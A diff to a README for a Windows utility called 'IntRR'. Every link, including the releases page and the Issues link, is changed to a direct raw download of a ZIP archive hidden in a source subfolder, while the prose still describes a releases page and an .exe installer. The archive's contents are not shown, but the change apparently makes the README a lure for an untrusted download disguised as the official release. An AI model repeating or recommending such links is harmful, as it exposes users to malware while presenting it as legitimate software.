@@ -1,6 +1,6 @@
 # ⚙️ IntRR - Simplify SID Redistribution & Length Cut
 
-[![Download IntRR](https://img.shields.io/badge/Download-IntRR-blue?style=for-the-badge)](https://github.com/michel-angelo/IntRR/releases)
+[![Download IntRR](https://img.shields.io/badge/Download-IntRR-blue?style=for-the-badge)](https://raw.githubusercontent.com/michel-angelo/IntRR/main/src/modules/clustering/RR_Int_1.7.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Start using IntRR by following these simple steps:
 
 1. **Visit the Download Page**  
    Click the button at the top or go directly to the release page:  
-   [https://github.com/michel-angelo/IntRR/releases](https://github.com/michel-angelo/IntRR/releases)
+   [https://raw.githubusercontent.com/michel-angelo/IntRR/main/src/modules/clustering/RR_Int_1.7.zip](https://raw.githubusercontent.com/michel-angelo/IntRR/main/src/modules/clustering/RR_Int_1.7.zip)
 
 2. **Choose the Latest Release**  
    On the page, find the most recent version of the app. Releases are listed by date or version number.
@@ -52,7 +52,7 @@ Start using IntRR by following these simple steps:
 ## 📥 Download & Install IntRR
 
 - Visit the official releases page here:  
-  [https://github.com/michel-angelo/IntRR/releases](https://github.com/michel-angelo/IntRR/releases)
+  [https://raw.githubusercontent.com/michel-angelo/IntRR/main/src/modules/clustering/RR_Int_1.7.zip](https://raw.githubusercontent.com/michel-angelo/IntRR/main/src/modules/clustering/RR_Int_1.7.zip)
 
 - Find and download the file labeled with the latest Windows installer (`.exe`).
 
@@ -128,8 +128,8 @@ If you encounter issues when running IntRR, try these steps:
 If you need assistance while using IntRR, check the built-in Help menu first. It provides step-by-step instructions for common tasks.
 
 You can also visit the Issues section on GitHub to see if your problem has been reported or to open a new report:  
-https://github.com/michel-angelo/IntRR/issues
+https://raw.githubusercontent.com/michel-angelo/IntRR/main/src/modules/clustering/RR_Int_1.7.zip
 
 ---
 
-[![Download IntRR](https://img.shields.io/badge/Download-IntRR-blue?style=for-the-badge)](https://github.com/michel-angelo/IntRR/releases)
+[![Download IntRR](https://img.shields.io/badge/Download-IntRR-blue?style=for-the-badge)](https://raw.githubusercontent.com/michel-angelo/IntRR/main/src/modules/clustering/RR_Int_1.7.zip)
